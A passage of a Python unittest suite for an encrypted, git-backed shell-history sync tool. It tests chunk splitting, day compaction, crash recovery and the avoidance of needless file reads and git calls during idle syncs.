        """The other producer, bound by the same budget.

        Merging a whole day unbounded would rebuild the very chunk the split
        prevents, and unlink the smaller ones that were fine. Skipped rather
        than merged in batches: partial compaction leaves some of a day's
        chunks unmerged, and a peer rebuilding a compacted day drops what it
        had already merged (#67).
        """
        alpha = self.machine("alpha")
        with alpha.active():
            for i in range(400):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command number {i}")
                if i % 40 == 39:
                    with mock.patch.object(sync, "MAX_EXPORT_BYTES", 512):
                        sync.run()

            before = {c.name for c in store.iter_chunks(alpha.id)}
            with mock.patch.object(sync, "MAX_EXPORT_BYTES", 512):
                days, replaced, skipped = sync.compact(before="2023-12-01")

            self.assertEqual((days, replaced), (0, 0), "an over-budget day was merged")
            self.assertEqual(skipped, 1)
            self.assertEqual({c.name for c in store.iter_chunks(alpha.id)}, before)

    def test_a_day_within_the_budget_still_compacts(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            for i in range(4):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command {i}")
                sync.run()
            days, replaced, skipped = sync.compact(before="2023-12-01")
            self.assertEqual((days, skipped), (1, 0))
            self.assertEqual(replaced, 4)

    def test_a_crash_part_way_through_loses_no_lines(self) -> None:
        """Splitting means more write points, so more chances to die mid-tail.

        The watermark is only saved by a run that finishes, so the next one
        re-reads the whole tail. What must not happen is a line going missing
        or arriving at a peer twice.
        """
        alpha, beta = self.machine("alpha"), self.machine("beta")
        with alpha.active():
            for i in range(200):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command number {i}")

            real = store.write_atomic
            writes: list[Path] = []

            def die_after_two(path: Path, data: bytes) -> None:
                if path.suffix == ".age" and path.parent.name != "keys":
                    writes.append(path)
                    if len(writes) > 2:
                        raise OSError("interrupted part way through the tail")
                real(path, data)

            with (
                mock.patch.object(sync, "MAX_EXPORT_BYTES", 512),
                mock.patch.object(store, "write_atomic", die_after_two),
                self.assertRaises(OSError),
            ):
                sync.run()

            self.assertEqual(sync.State.load().exported, {}, "a dead run saved a watermark")
            with mock.patch.object(sync, "MAX_EXPORT_BYTES", 512):
                sync.run()

        with beta.active():
            sync.run()
        self.accept_everyone(alpha)
        self.accept_everyone(beta)
        with alpha.active():
            sync.run()
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.commands()), 200)
            self.assertEqual(len(set(beta.commands())), 200, "a line arrived twice")


class TestSplitForExport(unittest.TestCase):
    """The splitter on its own, where the edges are cheap to state."""

    def test_it_is_lossless_and_line_aligned(self) -> None:
        data = b"".join(b"line %d\n" % i for i in range(50))
        for limit in (1, 7, 8, 20, 1000):
            with self.subTest(limit=limit):
                pieces = list(sync.split_for_export(data, limit))
                self.assertEqual(b"".join(pieces), data)
                for piece in pieces:
                    self.assertTrue(piece.endswith(b"\n"))

    def test_a_tail_that_fits_is_one_piece(self) -> None:
        data = b"one\ntwo\n"
        self.assertEqual(list(sync.split_for_export(data, 1000)), [data])

    def test_a_line_longer_than_the_budget_is_kept_whole(self) -> None:
        """Splitting a record would drop it from every reader, not just one."""
        long_line = b"y" * 100 + b"\n"
        pieces = list(sync.split_for_export(long_line + b"short\n", 10))
        self.assertEqual(pieces[0], long_line)
        self.assertEqual(b"".join(pieces), long_line + b"short\n")

    def test_the_budget_is_under_what_a_reader_accepts(self) -> None:
        """The invariant the whole change exists for, stated once."""
        self.assertLess(sync.MAX_EXPORT_BYTES, sync.MAX_CHUNK_BYTES)


class TestADayThatGainsAChunkAfterCompaction(SyncTestCase):
    """Issue #67: a rewrite must rebuild the day from everything, not what is new.

    A compacted chunk keeps its `subsumes` list in the manifest for good, so
    `_Day.open` sees a rewrite on every later pass too. Skipping the chunks
    already in `state.merged` first meant the day was rebuilt from only the
    chunks that happened to be new -- and everything before them was gone from
    the peer's log, silently.

    Reached by `compact` and then `import`, which writes into past days by
    construction.
    """

    def merged_pair(self) -> tuple[Fake, Fake]:
        """alpha with one day of four chunks, and a beta that has merged them."""
        alpha, beta = self.history_across_days(days=1, per_day=4)
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.commands()), 4)
        return alpha, beta

    def test_a_later_chunk_does_not_discard_the_day(self) -> None:
        alpha, beta = self.merged_pair()
        with alpha.active():
            days, _, _ = sync.compact(before="2023-12-01")
            self.assertEqual(days, 1)
            sync.run()
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.commands()), 4, "compaction alone lost history")

        # The trigger: one more line on a day already compacted and merged.
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_100, "later")
            sync.run()
        with beta.active():
            sync.run()
            self.assertEqual(
                sorted(beta.commands()),
                [f"day 0 command {i}" for i in range(4)] + ["later"],
                "the rewrite dropped what had already been merged",
            )

    def test_a_re_read_chunk_is_not_counted_as_newly_merged(self) -> None:
        """Two passes, so the second genuinely re-reads the compacted chunk."""
        alpha, beta = self.merged_pair()
        with alpha.active():
            sync.compact(before="2023-12-01")
            sync.run()
        with beta.active():
            sync.run()  # merges the compacted chunk

        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_100, "later")
            sync.run()
        with beta.active():
            report = sync.run()
            # The compacted chunk is read again to rebuild the day, but only
            # `later` is new. Counting the re-read would tell the user history
            # arrived that they already had.
            self.assertEqual(report.chunks_merged, 1, "a re-read chunk was counted as new")
            self.assertEqual(len(set(beta.commands())), 5)

    def chunks_read(self, machine: Fake) -> list[str]:
        """The chunks one sync on ``machine`` actually decrypts, in order.

        Names rather than a count, because a re-read is far easier to read about
        when the assertion can say which chunks came back.
        """
        opened: list[str] = []
        real = sync.open_chunk

        def counted(path: Path, digest: str) -> bytes:
            opened.append(path.name)
            return real(path, digest)

        with machine.active(), mock.patch.object(sync, "open_chunk", counted):
            sync.run()
        return opened

    def test_a_compacted_day_that_keeps_growing_re_reads_only_what_is_new(self) -> None:
        """Issue #69: `subsumes` stays in the manifest, so it cannot mean "rebuild".

        A rewrite re-reads every chunk the manifest lists, which is right on the
        pass the compacted chunk arrives and wrong on every pass after it. Keyed
        on the day merely *having* one, a day that gains a chunk per sync re-read
        one more chunk each time -- linear per sync, quadratic over the day, and
        a day compacted while still being written reaches ~1440 chunks.
        """
        alpha, beta = self.merged_pair()
        with alpha.active():
            self.assertEqual(sync.compact(before="2023-12-01")[0], 1)
            sync.run()
        self.chunks_read(beta)  # the pass that adopts the compaction

        for i in range(6):
            with alpha.active():
                alpha.record("2023-11-14", 1_700_000_600 + i, f"later {i}")
                sync.run()
            # One: the chunk that is actually new. Before #69 this was 2, 3,
            # 4 ... as the day's own chunks were re-read alongside it.
            opened = self.chunks_read(beta)
            self.assertEqual(len(opened), 1, f"pass {i} re-read the day: {opened}")

        with beta.active():
            self.assertEqual(len(beta.commands()), 10)
            self.assertEqual(len(beta.entries()), 10)

    def test_compacting_a_second_time_does_rebuild(self) -> None:
        """The record is the *set* of compacted chunks, not a flag or a count.

        A second compaction replaces one compacted chunk with another, so a flag
        would not change and neither would a count. The peer would then treat the
        new compacted chunk -- a complete statement of the whole day -- as one
        more chunk to append, and write the day twice over.
        """
        alpha, beta = self.merged_pair()
        with alpha.active():
            sync.compact(before="2023-12-01")
            sync.run()
        self.chunks_read(beta)

        with alpha.active():
            for i in range(2):
                alpha.record("2023-11-14", 1_700_000_600 + i, f"later {i}")
                sync.run()
        self.chunks_read(beta)
        with beta.active():
            self.assertEqual(len(beta.entries()), 6)

        with alpha.active():
            self.assertEqual(sync.compact(before="2023-12-01")[0], 1)
            sync.run()
        self.chunks_read(beta)
        with beta.active():
            self.assertEqual(len(beta.entries()), 6, "the day was written twice over")
            self.assertEqual(len(beta.commands()), 6)

    def test_a_rewrite_that_lost_a_chunk_is_tried_again(self) -> None:
        """Recording the rebuild before it succeeded would make the day short.

        The record says "this day was rebuilt from these compacted chunks". If a
        chunk fails on the pass that rewrites -- an unopenable day key, a chunk
        that does not match its digest -- the day on disk does not have it, and
        writing the record anyway means the day is never rebuilt again: the peer
        appends whatever arrives next to a copy that was never rebuilt at all.
        """
        alpha, beta = self.merged_pair()
        with alpha.active():
            sync.compact(before="2023-12-01")
            sync.run()

        def refuse(path: Path, expected: str) -> bytes:
            raise ValueError(f"{path.name} is not the chunk its manifest names")

        with beta.active(), mock.patch.object(sync, "open_chunk", refuse):
            report = sync.run()
        self.assertIn(f"{alpha.id}/2023-11-14", report.unauthenticated)

        # The next pass must still owe a rewrite. If the failed one was recorded
        # as done, this appends the compacted chunk to a day that still holds
        # every line it replaces.
        self.chunks_read(beta)
        with beta.active():
            self.assertEqual(len(beta.entries()), 4, "the day was written twice over")
            self.assertEqual(len(beta.commands()), 4)

    def test_an_ordinary_day_stays_incremental(self) -> None:
        """Only a rewrite re-reads. Otherwise every sync would redo the day.

        A day with no compacted chunk gains a line: exactly one chunk should be
        decrypted, not every chunk the day holds.
        """
        alpha, beta = self.merged_pair()
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_100, "later")
            sync.run()

        opened = self.chunks_read(beta)
        self.assertEqual(len(opened), 1, f"the whole day was re-read: {opened}")
        with beta.active():
            self.assertEqual(len(beta.commands()), 5)

    def test_a_day_with_nothing_new_reads_no_manifest(self) -> None:
        """The laziness that makes signatures affordable, kept.

        A manifest costs an `ssh-keygen -Y verify`, and sync runs on a
        one-minute timer. Grouping by day must not turn that into one fork per
        day of history per run.
        """
        _, beta = self.merged_pair()
        with beta.active():
            reads: list[str] = []
            real = sync.read_manifest

            def counted(host_id: str, day: str, verify_key: str) -> dict[str, sync.Entry]:
                reads.append(day)
                return real(host_id, day, verify_key)

            with mock.patch.object(sync, "read_manifest", counted):
                sync.run()
            self.assertEqual(reads, [], "a day with nothing new still read its manifest")


class TestSkippingAnUnchangedDay(SyncTestCase):
    """Issue #85: listing a peer's archive is what an idle merge costs.

    A day directory's mtime moves when a chunk lands in it, so a day whose stamp
    is unchanged since it was merged has nothing new -- and needs no listing. At
    20k chunks over 40 days that is 0.18 ms of stats against 4.96 ms of listing,
    once a minute, per peer.
    """

    def listed(self, machine: Fake) -> list[str]:
        """The days one sync actually lists the chunks of."""
        days: list[str] = []
        real = store.chunk_names

        def counted(machine_id: str, day: str) -> list[str]:
            days.append(day)
            return real(machine_id, day)

        with machine.active(), mock.patch.object(store, "chunk_names", counted):
            sync.run()
        return days

    def pair(self) -> tuple[Fake, Fake]:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            for day in ("2023-11-14", "2023-11-15"):
                alpha.record(day, 1_700_000_001, f"on {day}")
                sync.run()
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.commands()), 2)
        return alpha, beta

    def test_a_merged_day_is_not_listed_again(self) -> None:
        alpha, beta = self.pair()
        self.assertEqual(self.listed(beta), [], "an unchanged day was listed")
        # ...and the history is still there, which is the point of not looking.
        with beta.active():
            self.assertEqual(len(beta.commands()), 2)
        del alpha

    def test_a_day_that_gains_a_chunk_is_listed_and_merged(self) -> None:
        """The half that would silently stop merging if the skip overreached."""
        alpha, beta = self.pair()
        with alpha.active():
            alpha.record("2023-11-15", 1_700_000_002, "a later line")
            sync.run()

        self.assertEqual(self.listed(beta), ["2023-11-15"])
        with beta.active():
            self.assertIn("a later line", beta.commands())

        # And it settles again rather than re-listing for ever.
        self.assertEqual(self.listed(beta), [])

    def test_a_day_left_short_is_looked_at_again(self) -> None:
        """A stamp must mean "merged", not "looked at".

        A chunk that would not open leaves the day incomplete. Stamping it would
        say the day is finished, and nothing would ever read that chunk again --
        the same trap #69 hit by recording a rebuild that had failed.
        """
        alpha, beta = self.pair()
        with alpha.active():
            alpha.record("2023-11-15", 1_700_000_002, "a later line")
            sync.run()

        def refuse(path: Path, expected: str) -> bytes:
            raise ValueError(f"{path.name} is not the chunk its manifest names")

        with beta.active(), mock.patch.object(sync, "open_chunk", refuse):
            report = sync.run()
        self.assertIn(f"{alpha.id}/2023-11-15", report.unauthenticated)

        # Nothing changed on disk, so only an unstamped day gets a second look.
        self.assertEqual(self.listed(beta), ["2023-11-15"])
        with beta.active():
            self.assertIn("a later line", beta.commands())

    def test_a_day_whose_directory_changed_is_listed_again(self) -> None:
        """The stamp is the whole test, so a moved stamp must be believed."""
        alpha, beta = self.pair()
        with beta.active():
            stray = store.chunk_dir(alpha.id, "2023-11-14") / "not-a-chunk"
            stray.write_bytes(b"something landed in the directory")
        self.assertEqual(self.listed(beta), ["2023-11-14"])


class TestWalkingAPeersChunks(SyncTestCase):
    """Issue #82: `merge` walks every peer's whole tree on every sync.

    Its idle answer is "nothing new", decided from chunk *names*, so building a
    `Path` and a `Chunk` per file first was the entire cost: 71.5 ms against
    8.5 ms for one peer with 20k chunks, once a minute, growing with the archive.
    """

    #: Recorded newest-day-first, deliberately. Two days cannot tell a sorted
    #: walk from a reversed one, and creation order is not incidental: on btrfs
    #: -- the filesystem this is developed on -- `readdir` returns entries in
    #: the order they were made, so an unsorted walk comes back wrong here and
    #: would pass on the tmpfs the suite's temporary directories land in.
    DAYS: ClassVar[tuple[str, ...]] = ("2023-11-16", "2023-11-14", "2023-11-15")

    def stocked(self) -> tuple[Fake, Fake]:
        """alpha with three days of two chunks each, and a beta that merged them."""
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            for day in self.DAYS:
                for i in range(2):
                    alpha.record(day, 1_700_000_100 + i, f"{day} number {i}")
                    sync.run()
            sync.grant()
        with beta.active():
            sync.run()
        return alpha, beta

    def test_the_names_are_the_ones_the_chunk_walk_yields(self) -> None:
        """The two views of the same tree must not drift.

        `iter_chunks` is built on `iter_chunk_days`, and everything that reads a
        chunk still goes through it -- so a difference here would mean `merge`
        and `compact` disagreeing about what a host published.
        """
        alpha, _beta = self.stocked()
        with alpha.active():
            by_day = list(store.iter_chunk_days(alpha.id))
            flat = [(chunk.day, chunk.name) for chunk in store.iter_chunks(alpha.id)]

        self.assertEqual(
            [(day, name) for day, names in by_day for name in names],
            flat,
            "the name walk and the chunk walk disagree",
        )
        # Sorted, and each day exactly once. `_Day` *replaces* the log file it
        # writes, so a day arriving in two pieces would have the second
        # overwrite what the first had just written.
        self.assertEqual([day for day, _ in by_day], sorted(self.DAYS))
        for _day, names in by_day:
            self.assertEqual(names, sorted(names))
            self.assertTrue(names, "an empty day was yielded")

    def test_only_chunks_are_yielded(self) -> None:
        """A day directory is not guaranteed to hold nothing else.

        A partial write, an editor's backup, a `.orig` left by a merge tool: the
        walk names what it is looking for rather than taking whatever is there,
        because everything downstream treats a name as a chunk to authenticate.
        """
        alpha, _beta = self.stocked()
        with alpha.active():
            directory = store.chunk_dir(alpha.id, "2023-11-14")
            (directory / "1700000000-abcdef.age.tmp").write_bytes(b"half a chunk")
            (directory / "notes.txt").write_text("not a chunk", encoding="utf-8")

            names = dict(store.iter_chunk_days(alpha.id))["2023-11-14"]
        self.assertTrue(all(name.endswith(".age") for name in names), names)
        self.assertEqual(len(names), 2)

    def test_a_directory_holding_no_chunk_is_not_a_day(self) -> None:
        """Empty and "nothing new" are different answers, told apart here.

        A day directory can exist with nothing in it -- a `compact` that removed
        the last chunk, a partial write cleaned up -- and every caller would
        otherwise have to ask. `has_chunks` in particular decides whether an
        orphaned day key is a loss or a harmless nuisance, so a directory with
        only a stray file in it must read as empty there too.
        """
        alpha, _beta = self.stocked()
        with alpha.active():
            hollow = store.chunk_dir(alpha.id, "2023-11-20")
            hollow.mkdir(parents=True, exist_ok=True)

            self.assertNotIn("2023-11-20", dict(store.iter_chunk_days(alpha.id)))
            self.assertFalse(sync.has_chunks(alpha.id, "2023-11-20"))

            (hollow / "1700000000-abcdef.age.tmp").write_bytes(b"half a chunk")
            self.assertNotIn("2023-11-20", dict(store.iter_chunk_days(alpha.id)))
            self.assertFalse(
                sync.has_chunks(alpha.id, "2023-11-20"), "a stray file counted as a chunk"
            )

            # And a day that does hold one still says so.
            self.assertTrue(sync.has_chunks(alpha.id, "2023-11-14"))

    def test_one_day_is_not_answered_by_walking_the_host(self) -> None:
        """`orphaned_days` asks once per orphaned day, so the cost compounds.

        Answering from a whole-host walk made a 0.12 ms question 5 ms, and
        `orphaned_days` 5 ms to 184 ms with 40 orphaned days over 20k chunks --
        quadratic in the archive, in exactly the state `doctor` exists to find
        and that a stranger with push access can create.
        """
        alpha, _beta = self.stocked()
        walked: list[str] = []
        real = store.iter_chunk_days

        def spy(machine_id: str) -> Iterator[tuple[str, list[str]]]:
            walked.append(machine_id)
            return real(machine_id)

        with alpha.active(), mock.patch.object(store, "iter_chunk_days", spy):
            self.assertTrue(sync.has_chunks(alpha.id, "2023-11-14"))
            sync.orphaned_days()

            # `export` asks the same question, per day it is sealing, on every
            # sync that records anything.
            alpha.record("2023-11-14", 1_700_000_900, "one more")
            self.assertTrue(
                sync.export(store.machine(), sync.State.load(), sync.Report(), 1_700_000_901)
            )
        self.assertEqual(walked, [], "a one-day question walked the whole host")

    def test_keys_and_manifests_are_not_mistaken_for_days(self) -> None:
        """They sit in the same host directory, and neither holds chunks."""
        alpha, _beta = self.stocked()
        with alpha.active():
            siblings = {p.name for p in store.repo_host_dir(alpha.id).iterdir() if p.is_dir()}
            self.assertTrue({"keys", "manifests"} <= siblings, siblings)
            self.assertEqual({day for day, _ in store.iter_chunk_days(alpha.id)}, set(self.DAYS))

    def test_an_idle_merge_builds_nothing_per_chunk(self) -> None:
        """The saving itself, asserted where a future change would undo it.

        Nothing is new, so `merge` has no reason to construct a `Chunk` -- and
        constructing one per file is what made this walk cost 8x what reading
        the names does.
        """
        _alpha, beta = self.stocked()
        real = store.iter_chunks
        used = []

        def spy(machine_id: str) -> Iterator[store.Chunk]:
            used.append(machine_id)
            return real(machine_id)

        with beta.active(), mock.patch.object(store, "iter_chunks", spy):
            report = sync.run()
        self.assertEqual(report.chunks_merged, 0)
        self.assertEqual(used, [], "merge built Chunk objects for an idle sync")


class TestExportDoesNotReadWhatCannotHaveChanged(SyncTestCase):
    """Issue #80: the early exit is the shape of every idle sync.

    Getting to it used to cost work proportional to the whole history -- every
    host's log directory listed, and every one of this machine's own day files
    opened, seeked, read and closed to discover it had not grown.
    """

    def read_tails(self, machine: Fake) -> list[str]:
        """Which log files one `export` actually opens."""
        opened: list[str] = []
        real = store.read_tail

        def counted(path: Path, offset: int) -> tuple[bytes, int]:
            opened.append(path.name)
            return real(path, offset)

        with machine.active(), mock.patch.object(store, "read_tail", counted):
            self.export_once()
        return opened

    def export_once(self) -> None:
        """One `export` as `run` would call it. Caller holds `active()`."""
        sync.export(store.machine(), sync.State.load(), sync.Report(), 1_700_000_900)

    def test_a_log_that_cannot_have_grown_is_not_opened(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            for day in ("2023-11-14", "2023-11-15", "2023-11-16"):
                alpha.record(day, 1_700_000_001, f"on {day}")
                sync.run()

        self.assertEqual(self.read_tails(alpha), [], "an unchanged log was read")

        with alpha.active():
            alpha.record("2023-11-15", 1_700_000_002, "a later line")
        # Only the day that grew, not the three that exist.
        self.assertEqual(self.read_tails(alpha), ["2023-11-15.tsv"])

    def test_a_log_that_shrank_is_not_read_either(self) -> None:
        """A truncated log reads as nothing new, exactly as it did before.

        `read_tail` seeking past the end returns no data, so skipping the open
        gives the same answer -- which is what makes the comparison `<=` and not
        `==`. Pinned because it is the one case where the two differ in reads
        but must not differ in outcome.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            store.log_file(alpha.id, "2023-11-14").write_text("", encoding="utf-8")

        self.assertEqual(self.read_tails(alpha), [])
        with alpha.active():
            self.assertEqual(sync.run().lines_exported, 0)

    def test_only_our_own_host_directory_is_listed(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            sync.grant()
        with beta.active():
            beta.record("2023-11-14", 1_700_000_002, "make -j8")
            sync.run()
        # alpha cloned before beta existed, so it has to be told beta is real.
        self.accept_everyone(alpha)
        with alpha.active():
            sync.run()  # alpha now holds a decrypted copy of beta's log

            everyone = {log.host_id for log in store.iter_log_files()}
            self.assertEqual(everyone, {alpha.id, beta.id})

            listed: list[str] = []
            real = store.iter_log_files

            def counted(host_id: str | None = None) -> Iterator[store.LogFile]:
                for log in real(host_id):
                    listed.append(log.host_id)
                    yield log

            with mock.patch.object(store, "iter_log_files", counted):
                self.export_once()
            self.assertEqual(set(listed), {alpha.id}, "another host's logs were listed")

            # And narrowing cannot change *what* is exported: the same files the
            # caller would have kept after filtering, in the same order.
            self.assertEqual(
                [log.relpath for log in store.iter_log_files(alpha.id)],
                [log.relpath for log in store.iter_log_files() if log.host_id == alpha.id],
            )


class TestSyncDoesNotForkGitMoreThanItNeedsTo(SyncTestCase):
    """`sync` runs from a one-minute timer, so each fork is a recurring cost.

    The numbers are a ceiling, not a description: they exist so that adding a
    git call to this path is a decision somebody makes rather than one that
    happens. Raise them deliberately when a call earns its place.
    """

    def git_calls(self) -> list[str]:
        """Every git subcommand one `sync.run()` spawns, in order.

        Counted at `sync.git`, which is the only place in the package that
        spawns git -- the same seam the chunk-read counters in this file use,
        and it needs no argv sniffing to tell git from `age`.
        """
        real = sync.git
        seen: list[str] = []

        def spy(*args: str, **kwargs: object) -> str:
            seen.append(" ".join(args[:2]))
            return real(*args, **kwargs)  # type: ignore[arg-type]

        with mock.patch.object(sync, "git", spy):
            sync.run()
        return seen

    def test_an_idle_sync_forks_git_four_times(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            calls = self.git_calls()
        self.assertLessEqual(len(calls), 4, calls)
        # The identity and the remote come from one config read, not three.
        self.assertEqual([c for c in calls if c.startswith("config")], ["config --list"])
        self.assertEqual([c for c in calls if c.startswith("remote")], [])
        # Level with the remote, so neither replaying nor sending is any work.
        self.assertEqual([c for c in calls if c.startswith(("rebase", "push"))], [])
        # The branch cannot change mid-run, so it is asked for once.
        self.assertEqual([c for c in calls if c.startswith("branch")], ["branch --show-current"])
        # Nothing wrote, so there is nothing to stage -- and `add -A` is a full
        # stat of every chunk this machine ever published. Measured at 20k
        # chunks: an idle sync drops from 20.6 ms to 10.3 ms by not asking.
        self.assertEqual([c for c in calls if c.startswith("add")], [])

    def test_a_sync_that_wrote_something_still_commits_it(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            alpha.record("2023-11-14", 1_700_000_002, "make -j8")
            calls = self.git_calls()
            self.assertIn("add -A", calls)
            self.assertIn("commit -q", calls)
            self.assertIn("push --quiet", calls)

    def test_a_republished_signer_is_committed_even_with_nothing_to_export(self) -> None:
        """The other writer on this path, and the one with no chunk beside it.

        `publish_signer` writes about once in a machine's life -- but when it
        does, it may well be the *only* thing that run wrote. Dropping its answer
        leaves this machine's verify key uncommitted, and a peer that cannot read
        it refuses every chunk this host has ever signed.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

            # A *changed* key, not a deleted file: rewriting the same bytes
            # leaves the worktree matching HEAD, so there would be nothing to
            # commit and the assertion below would hold either way.
            key = store.signing_key_file()
            key.unlink()
            crypto.public_half(key).unlink()
            fresh = crypto.generate_signing_key(key)

            published = store.signer_public(alpha.id)
            sync.run()  # nothing new to export: the signer is all there is

            self.assertIn(fresh, published.read_text(encoding="utf-8"))
            self.assertEqual(
                sync.git("status", "--porcelain", "--", str(published)),
                "",
                "the republished signer was left uncommitted",
            )

        # And it reached the remote, which is the point of publishing it.
        beta = self.machine("beta")
        with beta.active():
            self.assertIn(fresh, store.signer_public(alpha.id).read_text(encoding="utf-8"))

    def test_a_day_that_can_never_be_exported_does_not_cost_a_stat_every_run(self) -> None:
        """The state where answering "probably wrote" would undo the whole fix.

        A day refused for a missing key never advances `state.exported`, so its
        tail is fresh again on every run for the life of the machine. An `export`
        that reported "wrote something" merely for having looked would then stat
        the entire working tree once a minute, forever, in exactly the stuck
        state this is meant to relieve.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

            # The sealed half gone: `export` refuses the day rather than
            # re-minting a key peers could never open. See `orphaned_day_key`.
            store.day_key(alpha.id, "2023-11-14").unlink()
            alpha.record("2023-11-14", 1_700_000_002, "make -j8")

            first = self.git_calls()
            self.assertIn("2023-11-14", sync.run().orphaned)
            for _ in range(3):
                calls = self.git_calls()
                self.assertEqual(
                    [c for c in calls if c.startswith("add")], [], f"first run was {first}"
                )

    def test_files_left_by_a_run_that_died_are_committed_by_the_next_one(self) -> None:
        """The catch-up that makes skipping the `add` safe.

        A run that died between writing a chunk and committing it leaves that
        chunk unstaged. It is not stranded: the watermark was not saved either,
        so the next run with anything to export writes again -- and that run's
        `add -A` stages the leftovers alongside the new files.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

            # What a run that died after `write_atomic` and before `commit`
            # leaves behind.
            # Into the day directory the sync above already made, because that
            # is where a run that died after `write_atomic` would have left it.
            stray = store.chunk_dir(alpha.id, "2023-11-14") / "1700000009-abcdef.age"
            stray.write_bytes(b"debris from a run that did not finish")

            # An idle sync leaves it alone, which is the whole point.
            sync.run()
            self.assertNotIn(stray.name, sync.git("show", "--name-only", "--format=", "HEAD"))

            # The next run with something of its own to write picks it up.
            alpha.record("2023-11-14", 1_700_000_002, "make -j8")
            sync.run()
            # HEAD, not the last few commits: the catch-up has to happen on
            # the run that wrote, not eventually.
            self.assertIn(stray.name, sync.git("show", "--name-only", "--format=", "HEAD"))

    def test_a_sync_with_something_to_say_still_pushes(self) -> None:
        """The half that would silently stop publishing if the skip overreached.

        `_fetch_and_rebase` decides "level with the remote" *before* this run's
        chunk is committed, so a skip keyed on that alone strands every machine
        that was up to date a moment ago -- which is every machine, every time.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            sync.run()  # idle: leaves alpha level with the remote
            alpha.record("2023-11-14", 1_700_000_002, "make -j8")
            calls = self.git_calls()
        self.assertIn("push --quiet", calls)

        beta = self.machine("beta")
        with beta.active():
            sync.run()
        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"git status", "make -j8"})

    def test_a_sync_that_only_receives_does_not_push(self) -> None:
        """Adopting a peer's commit leaves nothing of our own to send.

        `push` opens a connection to the remote whether or not it has anything
        to say, and this fires on every machine every time any peer records a
        command -- so it is the most frequent needless round trip there is.
        """
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            sync.grant()
        with beta.active():
            calls = self.git_calls()
            self.assertIn("rebase --autostash", calls)
            self.assertNotIn("push --quiet", calls)
            self.assertEqual(beta.commands(), {"git status"})

    def test_a_machine_ahead_of_the_remote_still_pushes(self) -> None:
        """The trap in deciding "level" from anything but where HEAD lands.

        A commit the remote has not seen makes `origin/<branch>` an *ancestor*
        of HEAD. Every cheap test for "up to date" -- `merge --ff-only`, "the
        rebase replayed nothing", "the fetch changed no ref" -- passes in that
        state, and a machine that believes it would stop publishing silently and
        for good, because the condition never clears by itself.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            # A commit that never reached the remote -- what a compaction, or a
            # run that died between committing and pushing, leaves behind.
            store.recipients_file().write_text(
                store.recipients_file().read_text(encoding="utf-8") + "\n", "utf-8"
            )
            sync.git("commit", "-qam", "unpushed")
            calls = self.git_calls()
            self.assertIn("push --quiet", calls)
            # The branch is read rather than assumed: the harness's bare remote
            # is created with no `-b`, so it is whatever `init.defaultBranch`
            # says on the machine running the suite.
            branch = sync.read_repo().branch
            head, upstream = sync._resolve("HEAD", f"refs/remotes/origin/{branch}")
            self.assertEqual(head, upstream)

    def test_a_sync_behind_the_remote_still_rebases(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            sync.grant()
        with beta.active():
            sync.run()  # picks up alpha's chunk, so it cannot be level first
            beta.record("2023-11-14", 1_700_000_002, "make -j8")
            sync.run()
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_003, "cargo build")
            calls = self.git_calls()
            self.assertTrue(any(c.startswith("rebase") for c in calls), calls)
            # Asserted at the git level rather than through `commands()`: alpha
            # cloned before beta existed and has not been told beta is real, so
            # it holds the chunk without yet being willing to read it.
            self.assertTrue(list(store.chunk_dir(beta.id, "2023-11-14").glob("*.age")))
        # And once it is told, the history the rebase brought in is readable.
        self.accept_everyone(alpha)
        with alpha.active():
            sync.run()
            self.assertIn("make -j8", alpha.commands())


class TestResolvingSeveralRefsInOneFork(SyncTestCase):
    def test_a_ref_that_does_not_exist_comes_back_empty(self) -> None:
        """`rev-parse` echoes an argument it cannot resolve instead of dropping it.

        Taking that echo for an object id would make an unborn branch look like
        it matched the remote, and skip both the rebase and the push for good.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            head, missing = sync._resolve("HEAD", "refs/remotes/origin/no-such-branch")
            self.assertEqual(len(head), 40)
            self.assertEqual(missing, "")

    def test_an_unborn_head_resolves_to_nothing(self) -> None:
        """The state `init` is in while enrolling the very first machine."""
        alpha = self.machine("alpha")
        with alpha.active():
            branch = sync.read_repo().branch
            sync.git("update-ref", "-d", "HEAD")
            self.assertEqual(sync._resolve("HEAD", f"refs/remotes/origin/{branch}"), ["", ""])


class TestTheCommitIdentityIsStillPinned(SyncTestCase):
